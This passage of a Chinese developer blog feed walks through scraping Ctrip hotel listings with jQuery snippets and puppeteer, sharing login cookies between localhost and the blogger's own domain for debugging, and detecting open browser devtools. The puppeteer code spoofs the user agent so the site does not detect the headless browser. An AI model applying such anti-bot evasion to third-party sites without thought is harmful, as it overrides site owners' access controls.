workUrl: <span class="string">'http://hotels.ctrip.com/hotel/shanghai2/zone368#ctm_ref=hod_hp_sb_lst'</span>,</span><br><span class="line">    <span class="comment">// 设置ua，不然ua中包含headless，会被识别出来，拒绝提供服务</span></span><br><span class="line">    ua: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'</span>,</span><br><span class="line">    viewport: &#123;</span><br><span class="line">      width: <span class="number">1920</span>,</span><br><span class="line">      height: <span class="number">1080</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> browserSetting = &#123;</span><br><span class="line">    <span class="comment">// 默认是headless的模式打开的,改为false可以打开实际的chrome，方便我们查看</span></span><br><span class="line">    <span class="comment">// 但是设置为true会快很多</span></span><br><span class="line">    headless: <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// 或者直接打开指定path的chrome，最好还是使用默认提供的chromium</span></span><br><span class="line">    executablePath: <span class="string">'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe'</span>,</span><br><span class="line">    <span class="comment">// 设置后可以操作慢点方便调试</span></span><br><span class="line">    <span class="comment">// slowMo: 250,</span></span><br><span class="line">    <span class="comment">// 打开F12</span></span><br><span class="line">    devtools: <span class="literal">true</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(browserSetting);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">  <span class="comment">// 页面设置</span></span><br><span class="line">  <span class="keyword">await</span> page.setViewport(conf.viewport);</span><br><span class="line">  <span class="keyword">await</span> page.setUserAgent(conf.ua);</span><br><span class="line">  <span class="comment">// await page.emulate(conf.device);</span></span><br><span class="line">  <span class="comment">// 页面跳转</span></span><br><span class="line">  <span class="keyword">await</span> page.goto(conf.workUrl);</span><br><span class="line">  <span class="comment">// page.$$(sel);= document.querySelectorAll(sel)</span></span><br><span class="line">  <span class="comment">// page.$(sel);= document.querySelector(sel)</span></span><br><span class="line">  <span class="comment">// page.$eval(sel);</span></span><br><span class="line">  <span class="comment">// page.$$eval(sel);</span></span><br><span class="line">  <span class="comment">// const els = await page.$$eval('p', els =&gt; els);// 奇怪的是这样得到的els里的元素都是&#123;&#125;</span></span><br><span class="line">  <span class="comment">// 改为</span></span><br><span class="line">  <span class="comment">// const elsHtml = await page.$$eval('p', els =&gt; els.map(el =&gt; el.innerHTML));</span></span><br><span class="line">  <span class="comment">// console.log(elsHtml);</span></span><br><span class="line">  <span class="comment">// 但个人觉得可以直接js实现的就不必用 puppeteer api，记一堆api不如用好js</span></span><br><span class="line">  <span class="keyword">const</span> hotels = <span class="keyword">await</span> page.evaluate(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 这里可以直接执行js代码了</span></span><br><span class="line">    <span class="keyword">const</span> resArr = [];</span><br><span class="line">    <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 注意此处的异步操作</span></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getRes</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="comment">// return new Promise((resolve, reject) =&gt; &#123;</span></span><br><span class="line">          <span class="comment">// 因为ctrip本来就有jQuery，所以可以直接使用</span></span><br><span class="line">          <span class="keyword">const</span> num = $(<span class="string">'.hotel_item'</span>).length;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">            <span class="keyword">const</span> item = $(<span class="string">'.hotel_item:eq('</span> + i + <span class="string">')'</span>);</span><br><span class="line">            <span class="keyword">const</span> hotel = &#123;</span><br><span class="line">              name: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'title'</span>)&#125;</span>`</span>,</span><br><span class="line">              address: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_item_htladdress'</span>).text().replace(<span class="regexp">/地图|街景/g</span>, <span class="string">''</span>)&#125;</span>`</span>,</span><br><span class="line">              url: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'href'</span>).replace(<span class="regexp">/\?.*/g</span>, <span class="string">''</span>)&#125;</span>`</span>,</span><br><span class="line">              rate: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_value'</span>).text()&#125;</span>`</span>,</span><br><span class="line">              price: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.J_price_lowList'</span>).text()&#125;</span>`</span>,</span><br><span class="line">            &#125;;</span><br><span class="line">            resArr.push(hotel);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">let</span> $nextBtn = $(<span class="string">'.c_down'</span>);</span><br><span class="line">          <span class="keyword">if</span> ($nextBtn.length) &#123;</span><br><span class="line">            $nextBtn.click();</span><br><span class="line">            timer = setTimeout(getData, <span class="number">1000</span>);</span><br><span class="line">            $nextBtn = <span class="literal">null</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            clearTimeout(timer);</span><br><span class="line">            resolve(resArr);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        getData();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 加debugger可以在打开的chrome里调试js</span></span><br><span class="line">    <span class="comment">// debugger;</span></span><br><span class="line">    <span class="keyword">return</span> getRes();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>以上功能都可以直接按上一篇在chrome snippet中实现，但是如果需要自动获取detail信息，就需要puppeteer来帮我们操作了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开始获取detail</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getDetail</span>(<span class="params">h</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> nh = h;</span><br><span class="line">  <span class="keyword">await</span> page.goto(<span class="string">`http://hotels.ctrip.com<span class="subst">$&#123;h.url&#125;</span>`</span>);</span><br><span class="line">  nh.info = <span class="keyword">await</span> page.evaluate(<span class="function"><span class="params">()</span> =&gt;</span> $(<span class="string">'#htlDes&gt;p'</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].data);</span><br><span class="line">  <span class="keyword">return</span> nh;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 数量太多测试时间太长，先测试4个试下</span></span><br><span class="line">hotels.length = <span class="number">4</span>;</span><br><span class="line"><span class="comment">// 此处await不能使用forEach，await不能放在循环中，使用promise.all</span></span><br><span class="line"><span class="comment">// 参见http://es6.ruanyifeng.com/#docs/async</span></span><br><span class="line"><span class="keyword">const</span> promises = hotels.map(<span class="function"><span class="params">h</span> =&gt;</span> getDetail(h));</span><br><span class="line"><span class="keyword">await</span> <span class="built_in">Promise</span>.all(promises);</span><br><span class="line"><span class="built_in">console</span>.log(hotels);</span><br></pre></td></tr></table></figure><p>node直接写入csv文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将得到的结果写入csv文件</span></span><br><span class="line">fs.writeFile(<span class="string">'hotels.csv'</span>, hotels, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 得到csv文件会有乱码问题，可以找框架来直接转为csv文件，此处不赘述</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>以上只是puppet的最基本常用的功能，还可以做很多诸如：自动化测试，前端性能测试，异常监控等。</p><p>如果你在尝试过程中也对异步操作比较困惑，可以一起复习下async和await和promise，参见这篇（TODO async和await）。</p><p>puppeteer和Selenium/WebDriver的主要区别：</p><p>Selenium/WebDriver适用于多种浏览器</p><p>puppeteer主要作用于chromium，做到极致</p><p>我个人觉得API很多，看了也记不住，用到再去查。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上一篇中我们通过自己手写代码完成了抓取list页中的基本数据，可是沙沙又提出了新的需求，如何抓取到每个酒店的装修时间和客房数量呢？我让她自己去研究八爪鱼去了，但是如果是真的撩妹，这可不就前功尽弃了。&lt;/p&gt;
&lt;p&gt;正好最近在研究反作弊中判断是否是webdriver，headless chrome，发现一个神器puppeteer，不需要学习python，用nodeJS就可以搞定，我的键盘已经等不及了，用了一天时间研究，分享给大家。&lt;/p&gt;
&lt;p&gt;其实主要是async和await的理解不够深刻，多花费了时间，实际上聪明如你半个小时应该就可以学会。&lt;/p&gt;
    
    </summary>
    
    
      <category term="puppeteer" scheme="https://evacoder.com/tags/puppeteer/"/>
    
  </entry>
  
  <entry>
    <title>「 puppeteer 」前端如何爬虫</title>
    <link href="https://evacoder.com/2019/02/12/js_spider/"/>
    <id>https://evacoder.com/2019/02/12/js_spider/</id>
    <published>2019-02-12T10:20:35.000Z</published>
    <updated>2019-03-13T10:53:30.979Z</updated>
    
    <content type="html"><![CDATA[<p>本文又名十行代码帮你撩妹。</p><h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>今天沙沙在群里向我们紧急求助，领导让她整理【携程江湾五角场地区的260家酒店的名称，价格，地址，网址，评分信息制成excel】。</p><p>PM（也是前php开发者）咕咕推荐了【八爪鱼】这个工具，不懂技术的小白也能抓取数据。</p><p>作为一个程序员，很惭愧的说自己其实没接触过爬虫，之前说的要学python也没学几天就放弃了，现学肯定来不及了，作为一个不懂python的前端，如何帮上沙沙的忙呢？<br><a id="more"></a></p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>其实也就是返回的json处理一下嘛，我们先来看看页面的逻辑。</p><p>先访问列出这260家酒店的url：<a href="http://hotels.ctrip.com/hotel/shanghai2/zone368#ctm_ref=hod_hp_sb_lst。" target="_blank" rel="noopener">http://hotels.ctrip.com/hotel/shanghai2/zone368#ctm_ref=hod_hp_sb_lst。</a></p><p>在chrome devtool的network中选择xhr，凭借我们多年的工作经验，来判断下到底是哪个接口返回了hotelsList的信息。<br><img src="/images/ctrip1.png" alt=""><br>先锁定了/AjaxGetGroupProductList.aspx这个接口，本以为直接copy下json，简单处理下就完工了，顶多有个分页</p><p>需要多次请求。但是what？这个接口居然没有response body！</p><p>回想起之前看到很多反爬故事的文章都出自携程和去哪儿，怎么可能这么容易就被爬到数据呢？</p><p>分析接口这条路可能还需要点成本，冷静下思考，其实小伙伴的要求并不高，数据量也并不大，说不定只通过前端知识就可以获取到我们想要的结果。</p><p>试了试八爪鱼，看起来也是设定好需要的div，获取div。马上有了思路，既然接口hook走不通，不如前端老本行，所见即所得，通过jquery直接获取页面上的元素，界面是不可能骗人的，那我们开始写代码。</p><h4 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = $(<span class="string">'.hotel_item'</span>).length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">  <span class="keyword">const</span> item = $(<span class="string">'.hotel_item:eq('</span> + i + <span class="string">')'</span>);</span><br><span class="line">  t += <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'title'</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">  <span class="subst">$&#123;item.find(<span class="string">'.hotel_item_htladdress'</span>).text().replace(<span class="regexp">/地图|街景/g</span>,<span class="string">''</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">  <span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'href'</span>).replace(<span class="regexp">/\?.*/g</span>, <span class="string">''</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">  <span class="subst">$&#123;item.find(<span class="string">'.hotel_value'</span>).text()&#125;</span>,<span class="subst">$&#123;item.find(<span class="string">'.J_price_lowList'</span>).text()&#125;</span>\n`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是酒店数据是分页显示的，只好手动一页一页的点击运行来获取。<br>Tips：<br>1.这里用到了chrome devtool的snippet，可以保存在chrome里，直接右键run一下就可以运行。比直接粘在console里要灵活。<br>2.携程本身的页面有jQuery，所以我们可以直接使用jQuery。<br><img src="/images/ctrip2.png" alt=""></p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>手动翻页也太low了吧，后来惊喜的发现居然是单页应用，点击下一页并没有刷新页面，我们可以用代码来帮我们直接点击。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> t = <span class="string">'名字,地址,网址,评分,价格\n'</span>;</span><br><span class="line">    <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">let</span> num = $(<span class="string">'.hotel_item'</span>).length;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> item = $(<span class="string">'.hotel_item:eq('</span> + i + <span class="string">')'</span>);</span><br><span class="line">        t += <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'title'</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;item.find(<span class="string">'.hotel_item_htladdress'</span>).text().replace(<span class="regexp">/地图|街景/g</span>,<span class="string">''</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'href'</span>).replace(<span class="regexp">/\?.*/g</span>, <span class="string">''</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;item.find(<span class="string">'.hotel_value'</span>).text()&#125;</span>,<span class="subst">$&#123;item.find(<span class="string">'.J_price_lowList'</span>).text()&#125;</span>\n`</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">let</span> $nextBtn = $(<span class="string">'.c_down'</span>);</span><br><span class="line">      <span class="keyword">if</span> ($nextBtn.length) &#123;</span><br><span class="line">        $nextBtn.click();</span><br><span class="line">        timer = setTimeout(getData, <span class="number">1000</span>);</span><br><span class="line">      <span class="comment">// 分页结束啦</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        clearTimeout(timer);</span><br><span class="line">        <span class="built_in">console</span>.log(t);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getData();</span><br><span class="line">  &#125;)();</span><br></pre></td></tr></table></figure><p>这样就可以自动翻页，完成时会把我们想要的数据直接console出来。</p><p>然后再找个转csv的工具就可以啦，时间紧张，先发给沙沙吧。</p><h4 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h4><p>虽然这篇的技术知识很简单，可能算不上爬虫，但我们可以回过头来分析下这个例子中携程是如何做反爬的。<br>首页的数据太多太杂，点了第二页，查看了下</p><p><img src="/images/ctrip3.png" alt=""><br>/AjaxHotelList.aspx才是真正的接口，我们需要的数据实际也不是json，而直接是html信息，这样坏人需要写很多的正则来获取，需要懂一些前端知识，而且作恶成本很高。</p><p>这个接口足足有182kb的大小，性能优化和反爬需要有个平衡。</p><p>所以这种数据量比较小的，没有时间要求的，还是从前端的角度来抓取数据会更靠谱一些。</p><p>思考下首页为啥没有这个请求数据的接口呢？</p><p>可能是考虑到首页SEO及渲染速度选择了服务端直出，所以有经验了我们就是应该直奔第二页，明白套路就能少走弯路。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1.接口返回的并不是规则的json数据，并不好解析，我们可以使用前端的jquery直接获取需要dom属性。</p><p>2.我们使用了chrome的<strong>Snippet</strong>功能，直接在页面中运行代码即可，还可以保存常用的util代码，比直接写在console中会优雅一些。</p><p>3.观察到是单页应用，可以自己写代码来点击切换到下一页。</p><p>4.json如何导出成excel呢？其实我们常用的一般都是csv文件，只要通过tab来分隔就可以了。</p><p>5.读取本地json文件$.getJSON</p><h4 id="思考-1"><a href="#思考-1" class="headerlink" title="思考"></a>思考</h4><p>虽然完成了，得到了技术小白沙沙的赞美，但是心里还是很虚。<br>主要问题有：<br>1.手动的可以全部自动化吗？<br>可以直接写入csv文件而不是copy console里的内容吗？<br>虽然传统的js是运行在浏览器中的，为了安全起见是不可以读写本地文件的，但是发现HTML5有新的API可以导出文件。但是这样还是勉强了些。</p><p>2.沙沙弱弱地说如果可以获取酒店的开业时间和房间数就好了。<br>嗷的，那还得点进去每个酒店的detail去查看，十行代码搞不定啦。<br>我知道可以使用webdriver，phantomJS等来模拟点击，具体的还有待研究。</p><p>不用担心，下篇文章我们会鸟枪换炮！</p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>只需要很少的代码量就可以达到我们的需求，js真的很强大呢！前端很好玩，能把前端用在生活中那就更美妙了，可以抢火车票啥的。</p><p>心虚的说了句要赶紧学python啦。另一只小白问要怎么才能学会编程，学了几天python没有动力就不想学了。</p><p>我觉得用一劳永逸的懒人思维思考问题，慢慢自己给自己提需求，这样就能发现科技的力量和智趣。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文又名十行代码帮你撩妹。&lt;/p&gt;
&lt;h4 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h4&gt;&lt;p&gt;今天沙沙在群里向我们紧急求助，领导让她整理【携程江湾五角场地区的260家酒店的名称，价格，地址，网址，评分信息制成excel】。&lt;/p&gt;
&lt;p&gt;PM（也是前php开发者）咕咕推荐了【八爪鱼】这个工具，不懂技术的小白也能抓取数据。&lt;/p&gt;
&lt;p&gt;作为一个程序员，很惭愧的说自己其实没接触过爬虫，之前说的要学python也没学几天就放弃了，现学肯定来不及了，作为一个不懂python的前端，如何帮上沙沙的忙呢？&lt;br&gt;
    
    </summary>
    
    
      <category term="puppeteer" scheme="https://evacoder.com/tags/puppeteer/"/>
    
  </entry>
  
  <entry>
    <title>「 效率 」前后端分离项目的本地代理及登录态绕过</title>
    <link href="https://evacoder.com/2019/01/05/proxy_login_state/"/>
    <id>https://evacoder.com/2019/01/05/proxy_login_state/</id>
    <published>2019-01-05T04:44:27.000Z</published>
    <updated>2019-03-13T10:25:28.681Z</updated>
    
    <content type="html"><![CDATA[<p>在开发新需求或者复现bug时，前端经常会通过代理工具将被本地修改的js，css代理到线上，这样可以不用一次一次的上线测试，在本地就可以随改随生效。</p><p>vue项目可以 <code>npm run serve</code> 本地跑起来，开发阶段接口调试时，最好能把所有localhost的本地接口全代理到【线上】，有很多方法。</p><a id="more"></a><h4 id="绕过跨域限制的方法"><a href="#绕过跨域限制的方法" class="headerlink" title="绕过跨域限制的方法"></a>绕过跨域限制的方法</h4><ol><li><p>使用vue-cli中默认带的http-proxy-middleware，具体配置参见<a href="https://github.com/chimurai/http-proxy-middleware" target="_blank" rel="noopener">http-proxy-middleware</a> 文档。</p></li><li><p>使用代理工具，fiddler 或 Charles设置cors。</p></li><li><p>使用chrome插件Allow-Control-Allow-Origin: *</p></li><li><p>让后端开启cors（尽量自给自足）。</p></li></ol><h4 id="如何绕过登录"><a href="#如何绕过登录" class="headerlink" title="如何绕过登录"></a>如何绕过登录</h4><p>但是遇到登录这个拦路虎，localhost下因为没有登录态，每次请求全部401，不能本地调试，代理完全都没用了。</p><p>后来同事分享了一个鸡贼的方法，真是个小机灵鬼~</p><p>以evacoder.com为例，因为登录态通过cookie来标志的，而此cookie下发在<code>evacoder.com</code>域下</p><p>怎么才能让localhost共享到登录态呢？</p><p>比如我npm run serve在localhost:8080，此项目需要登录态，我们可以配置host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 test.evacoder.com</span><br></pre></td></tr></table></figure><p>如果登录态的cookie不带点，也就是说子域不可访问，我们可以手动的chrome dev tool=&gt;Application=&gt;cookies下给它加个点。</p><p>这样我们测试的时候在evacoder登录之后下发了登录态，因为有代理，访问localhost:8080可以改为访问test.evacoder.com:8080就可以共享到登录态了。</p><p>少年你忘了还有丑陋的8080端口号吗？端口号不一样也是跨域的，那咋办呢？</p><p>我们还有大招nginx反向代理，nginx用处多多，此处只说怎么完成我们的需求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass    http://127.0.0.1:8080;</span><br><span class="line">        root   html;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将localhost:8080代理到localhost:80端口，80端口是默认端口，这样就可以不需要丑陋的端口直接访问了。</p><h4 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h4><p>为啥要这么麻烦呢？平常调试时不也就是用fiddler把线上的文件直接代理到本地就可以了么？</p><p>因为 <code>npm run serve</code> 生成的文件放在内存中，并没有实际的路径，但是我们还是可以使用 fiddler 通过autoresponse中使用正则来完成批量代理</p><p>只需将 <code>REGEX:https://evacoder.com/(.*)$</code> 代理到 <code>http://localhost:8080/$1</code> 即可。当然我们需要只代理静态文件，剔除api的代理。</p><p>虽然这样webpack HMR就没办法直接本地即改即生效了，但是我们还有办法，sublime上的livereload插件配合chrome上的livereload，保存文件时无脑刷新，虽然傻办法，但是还是可以节省点时间。</p><p>这样在开发过程中也可以开心的代理到线上即改即生效了~虽然功能很简单但是探索的过程很有趣，社会的发展都是懒人推动的哈哈哈。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在开发新需求或者复现bug时，前端经常会通过代理工具将被本地修改的js，css代理到线上，这样可以不用一次一次的上线测试，在本地就可以随改随生效。&lt;/p&gt;
&lt;p&gt;vue项目可以 &lt;code&gt;npm run serve&lt;/code&gt; 本地跑起来，开发阶段接口调试时，最好能把所有localhost的本地接口全代理到【线上】，有很多方法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Tool" scheme="https://evacoder.com/tags/Tool/"/>
    
  </entry>
  
  <entry>
    <title>JS检测是否打开了控制台（devtool）</title>
    <link href="https://evacoder.com/2018/12/28/js_devtool/"/>
    <id>https://evacoder.com/2018/12/28/js_devtool/</id>
    <published>2018-12-28T12:11:15.000Z</published>
    <updated>2019-03-13T10:59:11.057Z</updated>
    
    <content type="html"><![CDATA[<p>JS并没有直接提供判断检测用户是否打开devtool的API。<br>思考下，打开控制台有哪些特征呢？<br><a id="more"></a></p><p>1.按键类，用户按下了F12，cmd+i+u,右键选择审查元素等</p><p>但是打开devtool并不能用一种操作模式就能完全涵盖，不同操作系统下的键盘特征也不一样。</p><p>2.窗口宽度变化类，内部宽度变窄</p><p>Github上搜到这个 devtools-detect 只通过宽度检测加上直观的demo就可以拿到800+的stars哦。</p><p>核心代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> threshold = <span class="number">160</span>;</span><br><span class="line">setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> widthThreshold = <span class="built_in">window</span>.outerWidth - <span class="built_in">window</span>.innerWidth &gt; threshold;</span><br><span class="line">    <span class="keyword">var</span> heightThreshold = <span class="built_in">window</span>.outerHeight - <span class="built_in">window</span>.innerHeight &gt; threshold;</span><br><span class="line">    <span class="keyword">var</span> orientation = widthThreshold ? <span class="string">'vertical'</span> : <span class="string">'horizontal'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(heightThreshold &amp;&amp; widthThreshold) &amp;&amp;</span><br><span class="line">      ((<span class="built_in">window</span>.Firebug &amp;&amp; <span class="built_in">window</span>.Firebug.chrome &amp;&amp; <span class="built_in">window</span>.Firebug.chrome.isInitialized) || widthThreshold || </span><br><span class="line">      heightThreshold)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!devtools.open || devtools.orientation !== orientation) &#123;</span><br><span class="line">            emitEvent(<span class="literal">true</span>, orientation);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        devtools.open = <span class="literal">true</span>;</span><br><span class="line">        devtools.orientation = orientation;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (devtools.open) &#123;</span><br><span class="line">            emitEvent(<span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        devtools.open = <span class="literal">false</span>;</span><br><span class="line">        devtools.orientation = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">500</span>);</span><br></pre></td></tr></table></figure><p>主要思路是：一直500ms的间隔来监控是否出现内外宽高度差&gt;160的情况，基本的场景都可以覆盖，除了将调试窗口从页面中拖出来的情况。虽然思路很简单，但是人家的测试用例全呀！</p><p>不得不说确实很有效，但我们可以升级下，<strong>将setInterval改为window.onresize</strong>，性能上应该会好很多<br>TODO补充代码</p><p>3.特殊特征类<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> re = <span class="regexp">/x/</span>;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(re);</span><br><span class="line"></span><br><span class="line">  re.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// console.log(i);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'第 '</span> + (++i) + <span class="string">' 次打开控制台'</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.console &amp;&amp; <span class="built_in">window</span>.console.log) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"打开了控制台"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>参考 </p><p><a href="https://stackoverflow.com/questions/7798748/find-out-whether-chrome-console-is-open" target="_blank" 